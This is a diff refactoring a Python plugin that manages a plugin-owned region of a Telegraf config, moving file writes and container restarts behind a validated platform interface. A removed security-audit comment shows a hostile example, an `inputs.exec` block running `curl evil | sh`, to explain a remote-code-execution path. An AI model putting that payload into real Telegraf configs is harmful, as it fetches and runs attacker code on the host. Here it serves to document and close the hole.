@@ -1,92 +1,86 @@
 """Telegraf config-manager plugin (first-party module plugin).
 
-Responsibility (named for what it does): programmatically **manage the telegraf
-configuration** and get telegraf to run with the new config. It owns a delimited
-"managed region" of ``telegraf.conf`` (between the two markers) and rewrites only
-that region IN-PLACE, so the rest of the hand-maintained config is never touched.
+Responsibility: manage the **plugin-managed region** of the telegraf
+configuration and get telegraf onto the new config. The region sits between
+two markers in the runtime ``telegraf.conf``; the rest of the hand-maintained
+config is never touched.
 
-Reload strategy — BOTH, per design:
-  1. **watch-config** (happy path): telegraf runs with ``--watch-config=poll``, so
-     writing the file in-place is enough — telegraf re-reads it, no restart.
-  2. **restart fallback**: ``reload(force_restart=True)`` restarts the telegraf
-     container via the Docker Engine API over the mounted docker socket.
+Contract v2 (platform context): this plugin declares ``MANAGES =
+["telegraf"]`` and reaches telegraf only through ``self.ctx.telegraf.*``. It
+never opens the config file and never talks to Docker. The platform:
 
-This plugin does NOT do network discovery — that is a separate `network` plugin's
-job, which would feed discovered targets into this plugin's managed region.
+* validates the region (allowlisted ``[[inputs.*]]`` types only, no
+  environment substitution, size caps) and that the merged file still parses;
+* writes it atomically (temp file + rename in the config's directory);
+* applies it: telegraf runs with ``--watch-config=poll`` and picks the write up
+  without a restart. ``reload(force_restart=True)`` asks the platform for a
+  container restart, a rare fallback the platform audit-logs.
 
-Wiring (docker-compose.yml, plugin-registry service):
-  - ``TELEGRAF_CONFIG_PATH`` — writable bind mount of the same runtime telegraf.conf
-    the telegraf container reads (``:ro`` there); on the host this is the gitignored
-    ``telegraf.runtime.conf`` (see the note below).
-  - ``TELEGRAF_CONTAINER`` — container name for the restart fallback.
-  - ``/var/run/docker.sock`` + ``group_add`` — for the restart fallback only.
+The same code works when the plugin runs inside the plugin host process and
+when it runs in a separate runner: only the platform context differs.
 
-Note: the file the plugin writes is the **gitignored** ``telegraf.runtime.conf``
-(seeded from the git-tracked ``telegraf.conf`` template by setup.sh's
-``sync_telegraf_config``; both containers mount the runtime copy). The managed region
-ships EMPTY in the template; runtime writes land in the runtime copy, so the tracked
-template is never dirtied. See ``scripts/setup/config.py`` (TELEGRAF_TEMPLATE/RUNTIME).
+This plugin does NOT do network discovery. The ``network`` plugin feeds
+discovered targets into this plugin's managed region through
+``ctx.plugins.invoke("telegraf", "set_managed_region", ...)``.
 """
 
 import asyncio
 import logging
-import os
-import tomllib
 from datetime import datetime, timezone
 from typing import Dict, List, Optional
 
-import httpx
-from minder_plugin_sdk import PluginMetadata
+from minder_plugin_sdk import UNBOUND_CONTEXT, CapabilityInvalid, PluginMetadata
+from minder_plugin_sdk.context import (
+    CAP_TELEGRAF_SET_MANAGED_REGION,
+    PlatformContext,
+)
 
 __all__ = ["TelegrafPlugin"]
 
 logger = logging.getLogger("minder.plugin.telegraf")
 
-_MARKER_START = "# >>> minder telegraf-plugin managed >>>"
-_MARKER_END = "# <<< minder telegraf-plugin managed <<<"
-
-_DEFAULT_CONFIG_PATH = "/app/telegraf-config/telegraf.conf"
-_DEFAULT_CONTAINER = "minder-telegraf"
-_DOCKER_SOCK = "/var/run/docker.sock"
-_DOCKER_TIMEOUT = 10.0  # local unix socket → responds fast; don't stall the loop
-
 
 class TelegrafPlugin:
     """Manages the telegraf config's managed region and reloads telegraf."""
 
+    # Contract v2: the platform binds self.ctx and grants telegraf.* because of
+    # MANAGES. No outbound network access of its own (EGRESS: none).
+    CONTRACT_VERSION = 2
+    MANAGES = ["telegraf"]
+    EGRESS: List[str] = []
+
     # Methods invokable via POST /v1/plugins/telegraf/actions/<name> (JWT-gated).
     # Whitelist only — nothing else on the instance is reachable over HTTP.
     ACTIONS = frozenset({"set_managed_region", "clear_managed_region", "reload"})
-    # Admin-only subset (found in a fresh security re-audit): set_managed_region
-    # writes a caller-supplied string straight into telegraf's live config after
-    # only a syntax check (valid TOML, not a policy check on its CONTENT) and then
-    # reloads/restarts telegraf onto it. Telegraf's own `inputs.exec` input type
-    # runs an arbitrary shell command from its config -- a body like
-    # `[[inputs.exec]]\ncommands = ["curl evil | sh"]\n...` is valid TOML and
-    # would have passed straight through to a route gated by JWT-any-authenticated-
-    # user (get_current_user, no role check) before this. Any self-registered
-    # "user"-role account could reach this before this fix -- registration has no
-    # invite gate today (#1073, still open) -- an unauthenticated-adjacent RCE path
-    # onto the host telegraf runs on (which itself has Docker-socket-proxy restart
-    # access). Scoped to just these two (not `reload`): `reload` alone is a no-op
-    # unless `force_restart=True`, and even then only restarts a container --
-    # a nuisance, not arbitrary code execution.
+    # Admin-only subset: these two rewrite telegraf's live config. The platform
+    # validates the content (allowlisted input types only, so e.g. inputs.exec
+    # is refused), but changing what telegraf monitors stays an admin
+    # decision. `reload` alone is a no-op unless `force_restart=True`, and even
+    # then only restarts a container.
     ADMIN_ONLY_ACTIONS = frozenset({"set_managed_region", "clear_managed_region"})
+
+    # Class-level default so the attribute exists before the host binds one.
+    ctx: PlatformContext = UNBOUND_CONTEXT
 
     def __init__(self, config: Optional[Dict] = None):
         self.config = config or {}
-        self.config_path = os.environ.get("TELEGRAF_CONFIG_PATH", _DEFAULT_CONFIG_PATH)
-        self.container = os.environ.get("TELEGRAF_CONTAINER", _DEFAULT_CONTAINER)
         self.status = "registered"
-        # Serialise config read+write+reload so concurrent action calls can't
-        # interleave and corrupt the in-place write.
+        # Serialise write+reload so concurrent action calls can't interleave.
         self._lock = asyncio.Lock()
+        # The last region this instance wrote (None: not written since start).
+        # The platform owns the file; this is only what the plugin reports.
+        self._region: Optional[str] = None
+        self._last_write: Optional[Dict] = None
+
+    def bind_context(self, ctx: PlatformContext) -> None:
+        """Called by the host at load with this plugin's platform context."""
+        self.ctx = ctx
 
     # ── lifecycle ────────────────────────────────────────────────────────────
     async def register(self) -> PluginMetadata:
         return PluginMetadata(
             name="telegraf",
-            version="1.0.0",
+            version="2.0.0",
             description="Manages the telegraf config's managed region and reloads telegraf.",
             author="Minder <core@minder.local>",
             capabilities=["config-management", "reload"],
@@ -95,24 +89,27 @@ class TelegrafPlugin:
         )
 
     async def initialize(self) -> None:
-        # Do NOT mutate the config on init — the markers ship committed, so this is
-        # read-only validation (no runtime churn / no git diff unless inputs are
-        # actually managed later).
+        # Never touches the config on init: the region is only written when a
+        # caller sets it.
         self.status = "ready"
 
+    def _managed(self) -> bool:
+        return self.ctx.has(CAP_TELEGRAF_SET_MANAGED_REGION)
+
     async def health_check(self) -> Dict:
-        # monitoring.py reads health.get("healthy").
-        ok = os.path.isfile(self.config_path) and self._markers_present()
-        return {"healthy": bool(ok), "config_path": self.config_path}
+        # monitoring.py reads health.get("healthy"). Healthy when the platform
+        # grants this plugin the managed region (no grant: nothing can be set).
+        managed = self._managed()
+        return {"healthy": self.status == "ready" and managed, "managed": managed}
 
     async def collect_data(self) -> Dict:
-        """Read-only: report the managed region + telegraf container state."""
+        """Read-only: report what this plugin last wrote to the managed region."""
         return {
             "timestamp": datetime.now(timezone.utc).isoformat(),
-            "config_readable": os.path.isfile(self.config_path),
-            "markers_present": self._markers_present(),
+            "managed": self._managed(),
+            "region_written": self._region is not None,
             "managed_inputs": self.list_managed_inputs(),
-            "telegraf_running": await self._container_running(),
+            "last_write": self._last_write,
         }
 
     async def analyze(self) -> Dict:
@@ -123,74 +120,44 @@ class TelegrafPlugin:
         self.status = "shutdown"
 
     # ── config management ────────────────────────────────────────────────────
-    def _read(self) -> str:
-        with open(self.config_path, "r", encoding="utf-8") as f:
-            return f.read()
-
-    def _write_inplace(self, text: str) -> None:
-        # Truncate + write the SAME inode — critical so the telegraf bind mount
-        # keeps seeing the file (a write-rename would break the single-file mount,
-        # so an atomic temp+rename is deliberately NOT used here). Callers validate
-        # the content first (see set_managed_region), so we never write garbage.
-        with open(self.config_path, "r+", encoding="utf-8") as f:
-            f.seek(0)
-            f.write(text)
-            f.truncate()
-
-    def _markers_present(self) -> bool:
-        try:
-            text = self._read()
-        except OSError:
-            return False
-        return text.count(_MARKER_START) == 1 and text.count(_MARKER_END) == 1
-
-    def _split_on_markers(self, text: str) -> "tuple[str, str, str]":
-        """Return (head_incl_start, body, tail_incl_end); raises if the markers are
-        missing, duplicated, or out of order."""
-        if text.count(_MARKER_START) != 1 or text.count(_MARKER_END) != 1:
-            raise RuntimeError("telegraf config must have exactly one managed region")
-        start = text.index(_MARKER_START) + len(_MARKER_START)
-        end = text.index(_MARKER_END)
-        if start > end:
-            raise RuntimeError("telegraf managed-region markers are out of order")
-        return text[:start], text[start:end], text[end:]
-
     def list_managed_inputs(self) -> List[str]:
-        """Names of `[[inputs.X]]` blocks currently in the managed region."""
-        try:
-            _, body, _ = self._split_on_markers(self._read())
-        except (OSError, RuntimeError):
-            return []
+        """Names of the `[[inputs.X]]` blocks in the region this instance last
+        wrote (empty until it writes one)."""
         names = []
-        for line in body.splitlines():
+        for line in (self._region or "").splitlines():
             s = line.strip()
             if s.startswith("[[inputs.") and s.endswith("]]"):
                 names.append(s[len("[[inputs.") : -2])
         return names
 
     async def set_managed_region(self, body: str, reload: bool = True) -> Dict:
-        """Replace everything between the markers with ``body`` (validated, in-place).
+        """Replace everything between the markers with ``body``.
 
-        ``body`` is validated as TOML before it is written, so a malformed input can
-        never reach telegraf and crash-loop it.
+        The platform validates ``body`` before writing it, so a malformed or
+        disallowed region never reaches telegraf; a rejection raises
+        ``ValueError`` (a 400 for an action call) naming the rule it broke.
         """
+        if not isinstance(body, str):
+            raise ValueError("managed region body must be a string")
         body = body.strip("\n")
-        if body:
-            try:
-                tomllib.loads(body)
-            except tomllib.TOMLDecodeError as e:
-                raise ValueError(f"managed region body is not valid TOML: {e}") from e
         async with self._lock:
-            head, _, tail = self._split_on_markers(self._read())
-            new_text = head + "\n" + (body + "\n" if body else "") + tail
-            self._write_inplace(new_text)
-            result: Dict = {"written": True, "bytes": len(new_text)}
+            try:
+                written = await self.ctx.telegraf.set_managed_region(body)
+            except CapabilityInvalid as e:
+                raise ValueError(str(e)) from None
+            self._region = body
+            result: Dict = {"written": True, **(written or {})}
             if reload:
                 result["reload"] = await self.reload()
+            self._last_write = {
+                "at": datetime.now(timezone.utc).isoformat(),
+                "bytes": len(body.encode("utf-8")),
+                "inputs": len(self.list_managed_inputs()),
+            }
         logger.info(
             "telegraf managed region updated (%d bytes, %d input(s))",
-            len(new_text),
-            len(self.list_managed_inputs()),
+            self._last_write["bytes"],
+            self._last_write["inputs"],
         )
         return result
 
@@ -201,56 +168,9 @@ class TelegrafPlugin:
     async def reload(self, force_restart: bool = False) -> Dict:
         """Get telegraf onto the new config.
 
-        The in-place write already triggers telegraf's ``--watch-config=poll``
-        reload; that is the happy path and needs nothing here. Pass
-        ``force_restart=True`` to restart the container (fallback for when a reload
+        The platform's write already triggers telegraf's ``--watch-config=poll``
+        reload, so the normal path needs nothing more. ``force_restart=True``
+        asks the platform to restart the container (fallback for when a reload
         doesn't take).
         """
-        if force_restart:
-            restarted = await self._restart_container()
-            return {"method": "restart", "restarted": restarted}
-        return {"method": "watch-config", "restarted": False}
-
-    # ── docker engine API (httpx, already in the image) ───────────────────────
-    def _docker_client(self) -> httpx.AsyncClient:
-        """Talk to the Docker Engine API. Prefer the least-privilege
-        docker-socket-proxy over the network (``DOCKER_HOST=tcp://host:port``) — the
-        registry no longer mounts the raw socket (#65 item-2 security). Fall back to
-        the unix socket if DOCKER_HOST is unset (e.g. a dev run with the socket still
-        mounted)."""
-        docker_host = os.environ.get("DOCKER_HOST", "")
-        if docker_host.startswith("tcp://"):
-            base_url = "http://" + docker_host[len("tcp://") :]
-            return httpx.AsyncClient(base_url=base_url, timeout=_DOCKER_TIMEOUT)
-        transport = httpx.AsyncHTTPTransport(uds=_DOCKER_SOCK)
-        return httpx.AsyncClient(
-            transport=transport, base_url="http://docker", timeout=_DOCKER_TIMEOUT
-        )
-
-    async def _container_running(self) -> Optional[bool]:
-        try:
-            async with self._docker_client() as client:
-                r = await client.get(f"/containers/{self.container}/json")
-                if r.status_code != 200:
-                    logger.warning(
-                        "docker inspect %s → HTTP %s", self.container, r.status_code
-                    )
-                    return None
-                return bool(r.json().get("State", {}).get("Running"))
-        except Exception as e:  # socket missing/denied, timeout, decode, …
-            logger.warning("docker.sock inspect failed: %s: %s", type(e).__name__, e)
-            return None
-
-    async def _restart_container(self) -> bool:
-        try:
-            async with self._docker_client() as client:
-                r = await client.post(f"/containers/{self.container}/restart?t=10")
-                if r.status_code in (204, 200):
-                    return True
-                logger.warning(
-                    "docker restart %s → HTTP %s", self.container, r.status_code
-                )
-                return False
-        except Exception as e:
-            logger.warning("docker.sock restart failed: %s: %s", type(e).__name__, e)
-            return False
+        return await self.ctx.telegraf.reload(force=bool(force_restart))
